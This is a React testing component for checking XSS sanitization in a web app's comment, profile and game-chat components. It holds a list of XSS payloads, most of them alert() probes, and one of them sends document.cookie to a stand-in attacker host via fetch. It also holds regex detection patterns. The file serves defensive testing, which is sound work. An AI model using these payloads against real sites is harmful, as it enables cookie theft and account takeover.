/**
 * XSS Testing Component
 * Component for testing XSS protection in frontend
 */

import React, { useState } from 'react';
import { SafeComment, SafeUserProfile, SafeGameChat } from './SafeComponents.jsx';

/**
 * XSS Test payloads for testing
 */
const XSS_TEST_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src="x" onerror="alert(1)">',
  'javascript:alert("XSS")',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<svg onload="alert(1)">',
  '<body onload="alert(1)">',
  '<input type="text" onfocus="alert(1)" autofocus>',
  '<marquee onstart="alert(1)">',
  '<details open ontoggle="alert(1)">',
  '<select onfocus="alert(1)" autofocus>',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '<script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>',
  '<img src="x" onerror="eval(atob(\'YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\'))">',
  '<a href="javascript:alert(\'XSS\')">Click me</a>',
  '<form><button formaction="javascript:alert(\'XSS\')">Submit</button></form>'
];

export const XSSTestComponent = () => {
  const [selectedPayload, setSelectedPayload] = useState(XSS_TEST_PAYLOADS[0]);
  const [testResults, setTestResults] = useState([]);

  const runXSSTest = (payload, componentName) => {
    const result = {
      payload,
      componentName,
      timestamp: new Date().toISOString(),
      safe: true, // Will be updated based on actual rendering
      notes: 'Content properly sanitized'
    };

    // Check if payload contains dangerous content after rendering
    setTimeout(() => {
      const testContainer = document.querySelector(`[data-testid="${componentName}"]`);
      if (testContainer) {
        const innerHTML = testContainer.innerHTML;
        
        // Check for presence of dangerous content
        const dangerousPatterns = [
          /<script/i,
          /javascript:/i,
          /onerror=/i,
          /onload=/i,
          /onfocus=/i,
          /onclick=/i,
          /alert\(/i
        ];

        const foundDangerous = dangerousPatterns.some(pattern => 
          pattern.test(innerHTML)
        );

        if (foundDangerous) {
          result.safe = false;
          result.notes = 'WARNING: Dangerous content detected in rendered HTML!';
        }
      }

      setTestResults(prev => [...prev, result]);
    }, 100);
  };

  const runAllTests = () => {
    setTestResults([]);
    
    XSS_TEST_PAYLOADS.forEach((payload, index) => {
      setTimeout(() => {
        runXSSTest(payload, 'safe-comment');
        runXSSTest(payload, 'safe-user-profile');
        runXSSTest(payload, 'safe-game-chat');
      }, index * 200);
    });
  };

  const clearResults = () => {
    setTestResults([]);
  };

  return (
    <div className="xss-test-component">
      <h2>🛡️ XSS Protection Testing</h2>
      
      <div className="test-controls">
        <h3>Test Controls</h3>
        <select 
          value={selectedPayload} 
          onChange={(e) => setSelectedPayload(e.target.value)}
        >
          {XSS_TEST_PAYLOADS.map((payload, index) => (
            <option key={index} value={payload}>
              Payload {index + 1}: {payload.substring(0, 50)}...
            </option>
          ))}
        </select>
        
        <div className="buttons">
          <button onClick={() => runXSSTest(selectedPayload, 'safe-comment')}>
            Test Single Payload
          </button>
          <button onClick={runAllTests}>
            Run All Tests
          </button>
          <button onClick={clearResults}>
            Clear Results
          </button>
        </div>
      </div>

      <div className="test-components">
        <h3>Test Components</h3>
        
        <div className="component-test">
          <h4>Safe Comment Component</h4>
          <SafeComment
            author={selectedPayload}
            content={selectedPayload}
            timestamp="Test timestamp"
            allowHtml={false}
          />
        </div>

        <div className="component-test">
          <h4>Safe User Profile Component</h4>
          <SafeUserProfile
            username={selectedPayload}
            displayName={selectedPayload}
            bio={selectedPayload}
            avatarUrl="https://example.com/avatar.jpg"
          />
        </div>

        <div className="component-test">
          <h4>Safe Game Chat Component</h4>
          <SafeGameChat
            messages={[
              { player: selectedPayload, text: selectedPayload },
              { player: "SafePlayer", text: "This is a safe message" }
            ]}
          />
        </div>
      </div>

      <div className="test-results">
        <h3>Test Results ({testResults.length})</h3>
        
        {testResults.length === 0 ? (
          <p>No test results yet. Run some tests to see results.</p>
        ) : (
          <div className="results-list">
            {testResults.map((result, index) => (
              <div 
                key={index} 
                className={`result-item ${result.safe ? 'safe' : 'dangerous'}`}
              >
                <div className="result-header">
                  <span className={`status ${result.safe ? 'safe' : 'dangerous'}`}>
                    {result.safe ? '✅ SAFE' : '❌ DANGEROUS'}
                  </span>
                  <span className="component">{result.componentName}</span>
                  <span className="timestamp">{result.timestamp}</span>
                </div>
                <div className="result-payload">
                  <strong>Payload:</strong> {result.payload}
                </div>
                <div className="result-notes">
                  <strong>Notes:</strong> {result.notes}
                </div>
              </div>
            ))}
          </div>
        )}
        
        <div className="results-summary">
          <p>
            <strong>Summary:</strong> {' '}
            {testResults.filter(r => r.safe).length} safe, {' '}
            {testResults.filter(r => !r.safe).length} dangerous
          </p>
        </div>
      </div>

      <style jsx>{`
        .xss-test-component {
          padding: 20px;
          max-width: 1200px;
          margin: 0 auto;
        }

        .test-controls {
          background: #f5f5f5;
          padding: 15px;
          border-radius: 8px;
          margin-bottom: 20px;
        }

        .test-controls select {
          width: 100%;
          padding: 8px;
          margin-bottom: 10px;
        }

        .buttons button {
          margin-right: 10px;
          padding: 8px 16px;
          background: #007bff;
          color: white;
          border: none;
          border-radius: 4px;
          cursor: pointer;
        }

        .buttons button:hover {
          background: #0056b3;
        }

        .component-test {
          border: 1px solid #ddd;
          padding: 15px;
          margin-bottom: 15px;
          border-radius: 8px;
        }

        .result-item {
          border: 1px solid #ddd;
          padding: 10px;
          margin-bottom: 10px;
          border-radius: 4px;
        }

        .result-item.safe {
          border-color: #28a745;
          background: #f8fff8;
        }

        .result-item.dangerous {
          border-color: #dc3545;
          background: #fff8f8;
        }

        .status.safe {
          color: #28a745;
          font-weight: bold;
        }

        .status.dangerous {
          color: #dc3545;
          font-weight: bold;
        }

        .result-payload {
          font-family: monospace;
          background: #f8f9fa;
          padding: 5px;
          margin: 5px 0;
          border-radius: 3px;
          word-break: break-all;
        }
      `}</style>
    </div>
  );
};

export default XSSTestComponent;